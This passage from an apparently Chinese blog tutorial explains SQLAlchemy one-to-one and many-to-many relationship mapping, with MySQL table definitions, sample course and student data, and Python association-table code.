class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单的锁,<code>uselist</code> 需要设置为布尔值,而且在关系模式中是自动匹配的(除了一对一关系).如果是一对一关系,就需要在<code>一</code>的关系一行设置<code>uselist=False</code>(没有外键的一方).</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Parent</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>  __tablename__ <span class="token operator">=</span> <span class="token string">'parent'</span>  id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  child <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">"Child"</span><span class="token punctuation">,</span> uselist<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">"parent"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Child</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>  __tablename__ <span class="token operator">=</span> <span class="token string">'child'</span>  id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  parent_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'parent.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  parent <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">"Parent"</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">"child"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果使用的是<code>backref()</code> 函数,写法如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> backref<span class="token keyword">class</span> <span class="token class-name">Parent</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>  __tablename__ <span class="token operator">=</span> <span class="token string">'parent'</span>  id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  child_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'child.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  child <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">"Child"</span><span class="token punctuation">,</span> backref<span class="token operator">=</span>backref<span class="token punctuation">(</span><span class="token string">"parent"</span><span class="token punctuation">,</span> uselist<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="4-多对多关系-中间表无意义"><a href="#4-多对多关系-中间表无意义" class="headerlink" title="4.多对多关系-中间表无意义"></a>4.多对多关系-中间表无意义</h4><blockquote><p>这里只讨论多对多双向关系.</p><p>一个实体A的属性a的数据对象会对应多个实体B属性b的数据对象.从实体B属性b的角度看,它对应多个实体A属性a的数据对象.</p><p>比如说,学生和课程的关系.一个学生会学习多门课程,一个课程也会有多个学生学习.</p><p>在关系型数据库中,必须使用中间表来表示多对对的关系.中间表可以分成2种,一种是纯粹表示关系的中间表.一种是表示中间实体的中间表.</p><ul><li>第一种比较简单.只需要两列:<code>Aid</code>和<code>Bid</code>.<code>Aid</code>以外键关联到A表的主键,<code>Bid</code>以外键关联到B表的主键,然后这两个列联合组成主键.这个中间表纯粹是表示多对多关系而存在,在业务上不会有敌营的实体与之对应.比如学生和课程的关系.只需要知道哪些学生上那些课,那些课有哪些学生,不需要更多的信息的情况下,可以建立<code>学生课程</code> 中间表,表中只要包含学生id和课程id就可以了.</li><li>第二种是在纯粹的中间关系表的基础 上,加上了更多的属性,从而形成了一个新的实体.比如学生课程表的关系.如果需要记录学生选课的时间,选课后的考试成绩,那么就需要建立一个<code>选课</code> 实体.实体具有属性:<ul><li>选课id, 主键.</li><li>学生id, 与学生表做外键关联</li><li>课程id,与课程表做外键关联</li><li>选课时间</li><li>选课后成绩</li></ul></li></ul><p>而关联表的创建,在<code>sqlalchemy</code> 中要使用<code>Table</code> 对象模型,而不是使用类来对应.</p><p>什么是<code>Table</code>对象,其实<code>Model</code> 利用基类生成的<code>Parent_2</code> 就是一个<code>Table</code>对象.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>Parent_2<span class="token punctuation">.</span>__table__<span class="token punctuation">)</span>sqlalchemy<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>schema<span class="token punctuation">.</span>Table<span class="token operator">>></span><span class="token operator">></span> Parent_2<span class="token punctuation">.</span>__table__Table<span class="token punctuation">(</span><span class="token string">'parent_1'</span><span class="token punctuation">,</span> MetaData<span class="token punctuation">(</span>bind<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">,</span> Column<span class="token punctuation">(</span><span class="token string">'p_id'</span><span class="token punctuation">,</span> Integer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> table<span class="token operator">=</span><span class="token operator">&lt;</span>Parent_1<span class="token operator">></span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Column<span class="token punctuation">(</span><span class="token string">'p_name'</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> table<span class="token operator">=</span><span class="token operator">&lt;</span>Parent_1<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">,</span> schema<span class="token operator">=</span>None<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过导入这个<code>Table</code> 类,来查看它的方法</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Table<span class="token operator">>></span><span class="token operator">></span> help<span class="token punctuation">(</span>Table<span class="token punctuation">)</span>Help on <span class="token keyword">class</span> <span class="token class-name">Table</span> <span class="token keyword">in</span> module sqlalchemy<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>schema<span class="token punctuation">:</span><span class="token keyword">class</span> <span class="token class-name">Table</span><span class="token punctuation">(</span>sqlalchemy<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>base<span class="token punctuation">.</span>DialectKWArgs<span class="token punctuation">,</span> SchemaItem<span class="token punctuation">,</span> sqlalchemy<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>selectable<span class="token punctuation">.</span>TableClause<span class="token punctuation">)</span><span class="token operator">|</span>  Table<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kw<span class="token punctuation">)</span><span class="token operator">|</span>  <span class="token operator">|</span>  Represent a table <span class="token keyword">in</span> a database<span class="token punctuation">.</span><span class="token operator">|</span>  <span class="token operator">|</span>  e<span class="token punctuation">.</span>g<span class="token punctuation">.</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">|</span>  <span class="token operator">|</span>      mytable <span class="token operator">=</span> Table<span class="token punctuation">(</span><span class="token string">"mytable"</span><span class="token punctuation">,</span> metadata<span class="token punctuation">,</span><span class="token operator">|</span>                      Column<span class="token punctuation">(</span><span class="token string">'mytable_id'</span><span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">|</span>                      Column<span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>                 <span class="token punctuation">)</span><span class="token operator">|</span>  <span class="token operator">|</span>  The <span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">:</span>`<span class="token punctuation">.</span>Table` object constructs a unique instance of itself based<span class="token operator">|</span>  on its name <span class="token operator">and</span> optional schema name within the given<span class="token operator">|</span>  <span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">:</span>`<span class="token punctuation">.</span>MetaData` object<span class="token punctuation">.</span> Calling the <span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">:</span>`<span class="token punctuation">.</span>Table`<span class="token operator">|</span>  constructor <span class="token keyword">with</span> the same name <span class="token operator">and</span> same <span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">:</span>`<span class="token punctuation">.</span>MetaData` argument<span class="token operator">|</span>  a second time will <span class="token keyword">return</span> the <span class="token operator">*</span>same<span class="token operator">*</span> <span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">:</span>`<span class="token punctuation">.</span>Table` object <span class="token operator">-</span> <span class="token keyword">in</span> this way<span class="token operator">|</span>  the <span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">:</span>`<span class="token punctuation">.</span>Table` constructor acts <span class="token keyword">as</span> a registry function<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它就是用来表示数据库中的表的.</p><p>如何建立与中间表的联系.这个需要设置<code>relationship()</code> 中的<code>secondary</code> 参数</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> help<span class="token punctuation">(</span>ralationship<span class="token punctuation">)</span><span class="token punctuation">:</span>param secondary<span class="token punctuation">:</span><span class="token keyword">for</span> a many<span class="token operator">-</span>to<span class="token operator">-</span>many relationship<span class="token punctuation">,</span> specifies the intermediary table<span class="token punctuation">,</span> <span class="token operator">and</span> <span class="token keyword">is</span> typically an instance of <span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">:</span>`<span class="token punctuation">.</span>Table`<span class="token punctuation">.</span>In less common circumstances<span class="token punctuation">,</span> the argument may also be specified <span class="token keyword">as</span> an <span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">:</span>`<span class="token punctuation">.</span>Alias` construct<span class="token punctuation">,</span> <span class="token operator">or</span> even a <span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">:</span>`<span class="token punctuation">.</span>Join` construct<span class="token punctuation">.</span><span class="token comment" spellcheck="true"># 对于多对多关系，指定中间表，通常是.table的实例</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到,对于中间表来说,就是用这个参数指定的.而且它指定的是一个<code>Table</code> 对象实例.</p><p>这样,可以构建一个多对多的对应.</p><hr><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10226.png" alt="10226"></p><p>根据上图创建表:</p><p>使用<code>MySQL</code></p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">use</span> sqlalchemy<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token keyword">exists</span> course_1<span class="token punctuation">(</span>    c_id <span class="token keyword">int</span> <span class="token keyword">auto_increment</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    c_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>c_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> char <span class="token keyword">set</span> utf8 <span class="token keyword">comment</span> <span class="token string">"课程表1"</span><span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token keyword">exists</span> student_1<span class="token punctuation">(</span>    s_id <span class="token keyword">int</span> <span class="token keyword">auto_increment</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    s_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>s_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> char <span class="token keyword">set</span> utf8 <span class="token keyword">comment</span> <span class="token string">"学生表1"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- 中间表</span><span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token keyword">exists</span> course_student_1<span class="token punctuation">(</span>    c_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    s_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>c_id<span class="token punctuation">,</span> s_id<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">constraint</span> cons1 <span class="token keyword">foreign</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>c_id<span class="token punctuation">)</span> <span class="token keyword">references</span> course_1<span class="token punctuation">(</span>c_id<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">constraint</span> cons2 <span class="token keyword">foreign</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>s_id<span class="token punctuation">)</span> <span class="token keyword">references</span> student_1<span class="token punctuation">(</span>s_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> char <span class="token keyword">set</span> utf8 <span class="token keyword">comment</span> <span class="token string">"学生课程连接表"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- 插入数据</span><span class="token keyword">insert</span> <span class="token keyword">into</span> course_1 <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'语文'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'数学'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'英语'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> student_1 <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'赵一'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'钱二'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'孙三'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> course_student_1 <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>使用<code>SQLAlchemy</code>创建表的对应</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> and_<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span>  Table<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span>  PrimaryKeyConstraint<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span>Course_Student_1 <span class="token operator">=</span> Table<span class="token punctuation">(</span><span class="token string">'course_student_1'</span><span class="token punctuation">,</span> Base<span class="token punctuation">.</span>metadata<span class="token punctuation">,</span>                         Column<span class="token punctuation">(</span><span class="token string">'c_id'</span><span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'course_1.c_id'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                         Column<span class="token punctuation">(</span><span class="token string">'s_id'</span><span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'student_1.s_id'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                         <span class="token comment" spellcheck="true"># 表级别主键，指定多一个主键 name 可以指定主键的名称</span>                        PrimaryKeyConstraint<span class="token punctuation">(</span><span class="token string">'c_id'</span><span class="token punctuation">,</span> <span class="token string">'s_id'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'pk_course_student_1'</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true"># 如果是列级别,定义在类中,可以直接写类的属性</span>                       <span class="token comment" spellcheck="true"># Column('c_id', Integer, ForeignKey('course_1.c_id'), nullable=False, primary_key=True),</span>                       <span class="token comment" spellcheck="true"># Column('s_id', Integer, ForeignKey('student1.s_id'), nullable=False, primary_key=True)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Course_1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'course_1'</span>    c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>    c_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 创建 双向关系</span>    <span class="token comment" spellcheck="true"># 字段第一个 指向 子类</span>    <span class="token comment" spellcheck="true"># 第二个指向 Table  实例</span>    <span class="token comment" spellcheck="true"># 第三个 双向 参数,必须保证子类中有这个属性</span>    student <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Student_1'</span><span class="token punctuation">,</span> secondary<span class="token operator">=</span>Course_Student_1<span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'course'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Student_1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'student_1'</span>    s_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    s_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 创建双向关系</span>    <span class="token comment" spellcheck="true"># 第一个指向父类</span>    <span class="token comment" spellcheck="true"># 第二个指向 Table 实例</span>    <span class="token comment" spellcheck="true"># 第三个 双向参数 必须保证父类中有这个属性</span>    course <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Course_1'</span><span class="token punctuation">,</span> secondary<span class="token operator">=</span>Course_Student_1<span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'student'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 映射完成后,查询验证</span>q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Course_1<span class="token punctuation">)</span><span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span>q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Student_1<span class="token punctuation">)</span><span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="5-多对多关系-中间表有意义"><a href="#5-多对多关系-中间表有意义" class="headerlink" title="5.多对多关系-中间表有意义"></a>5.多对多关系-中间表有意义</h4><blockquote><p>使用<code>MySQL</code>创建表</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token keyword">exists</span> course_2<span class="token punctuation">(</span>    c_id <span class="token keyword">int</span> <span class="token keyword">auto_increment</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    c_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>c_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> char <span class="token keyword">set</span> utf8 <span class="token keyword">comment</span> <span class="token string">"课程表2"</span><span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token keyword">exists</span> student_2<span class="token punctuation">(</span>    s_id <span class="token keyword">int</span> <span class="token keyword">auto_increment</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    s_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>s_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> char <span class="token keyword">set</span> utf8 <span class="token keyword">comment</span> <span class="token string">"学生表2"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- 中间表,有意义</span><span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token keyword">exists</span> course_student_2<span class="token punctuation">(</span>    e_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>    c_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    s_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    e_time <span class="token keyword">date</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    e_score <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>e_id<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">constraint</span> cons3 <span class="token keyword">foreign</span> <span class="token keyword">key</span><span class="token punctuation">(</span>c_id<span class="token punctuation">)</span> <span class="token keyword">references</span> course_2<span class="token punctuation">(</span>c_id<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">constraint</span> cons4 <span class="token keyword">foreign</span> <span class="token keyword">key</span><span class="token punctuation">(</span>s_id<span class="token punctuation">)</span> <span class="token keyword">references</span> student_2<span class="token punctuation">(</span>s_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> char <span class="token keyword">set</span> utf8 <span class="token keyword">comment</span> <span class="token string">"学生课程连接表2"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- 插入数据</span><span class="token keyword">insert</span> <span class="token keyword">into</span> course_2 <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'语文'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'数学'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'英语'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> student_2 <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'赵一'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'钱二'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'孙三'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> course_student_2 <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2010-12-1'</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token 